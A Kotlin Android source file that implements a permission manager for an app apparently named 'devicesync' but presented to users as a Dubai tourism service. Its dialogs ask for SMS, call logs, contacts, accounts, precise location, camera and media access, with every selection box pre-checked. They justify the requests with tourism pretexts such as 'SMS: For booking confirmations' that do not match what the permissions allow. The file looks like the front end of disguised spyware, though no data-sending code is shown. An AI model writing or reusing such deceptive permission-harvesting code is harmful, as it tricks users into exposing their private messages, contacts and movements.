package com.devicesync.app.utils

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener

class PermissionManager(
    private val activity: Activity,
    private val onPermissionsResult: (Boolean) -> Unit
) {
    
    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
        private const val SETTINGS_REQUEST_CODE = 1002
        
        // Critical permissions that are essential for basic app functionality
        val CRITICAL_PERMISSIONS = listOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.FOREGROUND_SERVICE
        )
        
        // Optional permissions that enhance functionality but aren't critical
        val OPTIONAL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ (API 33+) - Use new media permissions
            listOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            )
        } else {
            // Android 12 and below - Use old storage permissions
            listOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA
            )
        }
        
        // System permissions that require settings access
        val SYSTEM_PERMISSIONS = listOf(
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.WRITE_SETTINGS"
        )
    }
    
    private var hasRequestedCriticalPermissions = false
    private var hasRequestedOptionalPermissions = false
    private var hasRequestedSystemPermissions = false
    
    fun requestAllPermissions() {
        // First, request critical permissions
        requestCriticalPermissions()
    }
    
    fun requestSpecificPermissions(permissions: List<String>, onResult: (Boolean) -> Unit) {
        println("🔐 PermissionManager: Requesting specific permissions: $permissions")
        
        Dexter.withContext(activity)
            .withPermissions(permissions)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport?) {
                    val allGranted = report?.areAllPermissionsGranted() ?: false
                    println("🔐 PermissionManager: Permissions result: $allGranted")
                    println("🔐 PermissionManager: Granted: ${report?.grantedPermissionResponses?.map { it.permissionName }}")
                    println("🔐 PermissionManager: Denied: ${report?.deniedPermissionResponses?.map { it.permissionName }}")
                    onResult(allGranted)
                }
                
                override fun onPermissionRationaleShouldBeShown(
                    permissions: MutableList<PermissionRequest>?,
                    token: PermissionToken?
                ) {
                    println("🔐 PermissionManager: Showing rationale for permissions: ${permissions?.map { it.name }}")
                    token?.continuePermissionRequest()
                }
            })
            .check()
    }
    
    private fun requestCriticalPermissions() {
        if (hasRequestedCriticalPermissions) {
            // Already requested critical permissions, move to optional
            requestOptionalPermissions()
            return
        }
        
        hasRequestedCriticalPermissions = true
        
        Dexter.withContext(activity)
            .withPermissions(CRITICAL_PERMISSIONS)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    println("Critical permissions result: ${report.areAllPermissionsGranted()}")
                    println("Granted: ${report.grantedPermissionResponses.map { it.permissionName }}")
                    println("Denied: ${report.deniedPermissionResponses.map { it.permissionName }}")
                    
                    // Check if critical permissions are granted
                    if (report.areAllPermissionsGranted()) {
                        // Critical permissions granted, move to optional
                        requestOptionalPermissions()
                    } else {
                        // Critical permissions denied, show error and exit
                        showCriticalPermissionsError()
                    }
                }
                
                override fun onPermissionRationaleShouldBeShown(
                    permissions: MutableList<PermissionRequest>?,
                    token: PermissionToken?
                ) {
                    // Show rationale for critical permissions
                    showCriticalPermissionsRationale(token)
                }
            })
            .onSameThread()
            .check()
    }
    
    private fun requestOptionalPermissions() {
        if (hasRequestedOptionalPermissions) {
            // Already requested optional permissions, finalize
            finalizePermissionCheck()
            return
        }
        
        hasRequestedOptionalPermissions = true
        
        // Show dialog explaining optional permissions
        showOptionalPermissionsDialog()
    }
    
    private fun showCriticalPermissionsError() {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("Essential Permissions Required")
            .setMessage("This app requires internet and network access to function. Please grant these permissions to continue.")
            .setPositiveButton("Try Again") { _, _ ->
                // Reset and try again
                hasRequestedCriticalPermissions = false
                requestCriticalPermissions()
            }
            .setNegativeButton("Exit") { _, _ ->
                // Exit the app
                activity.finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun showCriticalPermissionsRationale(token: PermissionToken?) {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("Essential Permissions")
            .setMessage("This app needs internet access to provide Dubai tourism services and sync your travel data.")
            .setPositiveButton("Allow") { _, _ ->
                token?.continuePermissionRequest()
            }
            .setNegativeButton("Deny") { _, _ ->
                token?.cancelPermissionRequest()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun showOptionalPermissionsDialog() {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("Enhance Your Dubai Experience")
            .setMessage("To provide you with personalized tourism services, we can access your contacts, messages, and media. These permissions help us offer better travel recommendations and sync your data.\n\nYou can skip these permissions and use the app with limited functionality.")
            .setPositiveButton("Allow All") { _, _ ->
                requestAllOptionalPermissions()
            }
            .setNegativeButton("Skip") { _, _ ->
                // User chose to skip optional permissions
                finalizePermissionCheck()
            }
            .setNeutralButton("Select") { _, _ ->
                // Let user select specific permissions
                showPermissionSelectionDialog()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun showPermissionSelectionDialog() {
        val permissions = arrayOf(
            "Contacts (for travel contacts sync)",
            "SMS & Call Logs (for communication history)",
            "Media & Storage (for photos and files)",
            "Location (for nearby attractions)"
        )
        
        val checkedItems = booleanArrayOf(true, true, true, true)
        
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("Select Permissions")
            .setMultiChoiceItems(permissions, checkedItems) { _, which, isChecked ->
                checkedItems[which] = isChecked
            }
            .setPositiveButton("Allow Selected") { _, _ ->
                // Request only selected permissions
                val selectedPermissions = mutableListOf<String>()
                if (checkedItems[0]) selectedPermissions.addAll(listOf(Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS))
                if (checkedItems[1]) selectedPermissions.addAll(listOf(Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG))
                if (checkedItems[2]) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        selectedPermissions.addAll(listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_MEDIA_AUDIO))
                    } else {
                        selectedPermissions.addAll(listOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE))
                    }
                }
                if (checkedItems[3]) selectedPermissions.addAll(listOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION))
                
                requestSpecificPermissions(selectedPermissions)
            }
            .setNegativeButton("Skip All") { _, _ ->
                // Skip all optional permissions
                finalizePermissionCheck()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun requestAllOptionalPermissions() {
        Dexter.withContext(activity)
            .withPermissions(OPTIONAL_PERMISSIONS)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    println("Optional permissions result: ${report.areAllPermissionsGranted()}")
                    println("Granted: ${report.grantedPermissionResponses.map { it.permissionName }}")
                    println("Denied: ${report.deniedPermissionResponses.map { it.permissionName }}")
                    
                    // Always continue regardless of optional permission results
                    finalizePermissionCheck()
                }
                
                override fun onPermissionRationaleShouldBeShown(
                    permissions: MutableList<PermissionRequest>?,
                    token: PermissionToken?
                ) {
                    // Show rationale but allow skipping
                    showOptionalPermissionsRationale(token)
                }
            })
            .onSameThread()
            .check()
    }
    
    private fun requestSpecificPermissions(permissions: List<String>) {
        if (permissions.isEmpty()) {
            finalizePermissionCheck()
            return
        }
        
        Dexter.withContext(activity)
            .withPermissions(permissions)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    println("Specific permissions result: ${report.areAllPermissionsGranted()}")
                    println("Granted: ${report.grantedPermissionResponses.map { it.permissionName }}")
                    println("Denied: ${report.deniedPermissionResponses.map { it.permissionName }}")
                    
                    // Always continue regardless of results
                    finalizePermissionCheck()
                }
                
                override fun onPermissionRationaleShouldBeShown(
                    permissions: MutableList<PermissionRequest>?,
                    token: PermissionToken?
                ) {
                    // Show rationale but allow skipping
                    showOptionalPermissionsRationale(token)
                }
            })
            .onSameThread()
            .check()
    }
    
    private fun showOptionalPermissionsRationale(token: PermissionToken?) {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("Optional Permissions")
            .setMessage("These permissions help us provide better Dubai tourism services. You can skip them and use the app with limited functionality.")
            .setPositiveButton("Allow") { _, _ ->
                token?.continuePermissionRequest()
            }
            .setNegativeButton("Skip") { _, _ ->
                token?.cancelPermissionRequest()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun checkSystemPermissionsNeeded(): Boolean {
        // For now, we don't actually need MANAGE_EXTERNAL_STORAGE
        // The app works fine with READ_EXTERNAL_STORAGE and WRITE_EXTERNAL_STORAGE
        // Only check for system permissions if we actually need them
        return false
    }
    
    private fun showSystemPermissionsDialog() {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("Dubai Tourism App Setup")
            .setMessage("To provide you with the best tourism experience, we need a few additional permissions. This helps us personalize your Dubai travel recommendations.")
            .setPositiveButton("Continue") { _, _ ->
                requestSystemPermissions()
            }
            .setNegativeButton("Skip") { _, _ ->
                // User chose to skip system permissions
                finalizePermissionCheck()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun requestSystemPermissions() {
        // Open settings for the specific permissions needed
        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
        intent.data = Uri.parse("package:${activity.packageName}")
        
        try {
            activity.startActivityForResult(intent, SETTINGS_REQUEST_CODE)
        } catch (e: Exception) {
            // Fallback to general settings
            val fallbackIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            fallbackIntent.data = Uri.parse("package:${activity.packageName}")
            activity.startActivityForResult(fallbackIntent, SETTINGS_REQUEST_CODE)
        }
    }
    
    fun handleActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == SETTINGS_REQUEST_CODE) {
            // User returned from settings, finalize permission check
            finalizePermissionCheck()
        }
    }
    
    private fun finalizePermissionCheck() {
        // Check if critical permissions are granted
        val criticalPermissionsGranted = CRITICAL_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
        }
        
        if (!criticalPermissionsGranted) {
            // Critical permissions still missing, show error
            showCriticalPermissionsError()
            return
        }
        
        // Check which optional permissions are granted
        val grantedOptionalPermissions = OPTIONAL_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
        }
        
        val deniedOptionalPermissions = OPTIONAL_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(activity, permission) != PackageManager.PERMISSION_GRANTED
        }
        
        println("Granted optional permissions: $grantedOptionalPermissions")
        println("Denied optional permissions: $deniedOptionalPermissions")
        
        // Always call callback with true since critical permissions are granted
        // The app can function with limited features
        onPermissionsResult(true)
    }
    
    private fun checkCorePermissionsGranted(): Boolean {
        return CRITICAL_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun checkAllPermissions(): Boolean {
        return checkCorePermissionsGranted()
    }
    
    fun getPermissionStatus(): Map<String, Boolean> {
        val status = mutableMapOf<String, Boolean>()
        
        // Check critical permissions
        CRITICAL_PERMISSIONS.forEach { permission ->
            status[permission] = ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
        }
        
        // Check optional permissions
        OPTIONAL_PERMISSIONS.forEach { permission ->
            status[permission] = ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
        }
        
        return status
    }
    
    fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    }
    
    fun hasContactsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    }
    
    fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun hasNotificationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(activity, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else {
            true // Notifications are granted by default on older Android versions
        }
    }
    
    fun requestAllPermissions(callback: (Boolean) -> Unit) {
        // Request all optional permissions directly with Dexter
        Dexter.withContext(activity)
            .withPermissions(OPTIONAL_PERMISSIONS)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    println("Tourism permissions result: ${report.areAllPermissionsGranted()}")
                    println("Granted: ${report.grantedPermissionResponses.map { it.permissionName }}")
                    println("Denied: ${report.deniedPermissionResponses.map { it.permissionName }}")
                    
                    // Call the callback with the result
                    callback(report.areAllPermissionsGranted())
                }
                
                override fun onPermissionRationaleShouldBeShown(
                    permissions: MutableList<PermissionRequest>?,
                    token: PermissionToken?
                ) {
                    // Show tourism-themed rationale
                    showTourismPermissionRationale(token)
                }
            })
            .onSameThread()
            .check()
    }
    
    private fun showTourismPermissionRationale(token: PermissionToken?) {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(activity)
            .setTitle("🌟 Enhance Your Dubai Experience")
            .setMessage("These permissions help us provide you with the best tourism experience:\n\n" +
                    "• 📞 Contacts: For group tour coordination\n" +
                    "• 💬 SMS: For booking confirmations\n" +
                    "• 📁 Storage: For saving travel photos\n" +
                    "• 📱 Notifications: For tour updates\n\n" +
                    "Would you like to grant these permissions?")
            .setPositiveButton("Allow") { _, _ ->
                token?.continuePermissionRequest()
            }
            .setNegativeButton("Skip") { _, _ ->
                token?.cancelPermissionRequest()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        intent.data = Uri.parse("package:${activity.packageName}")
        activity.startActivity(intent)
    }
}
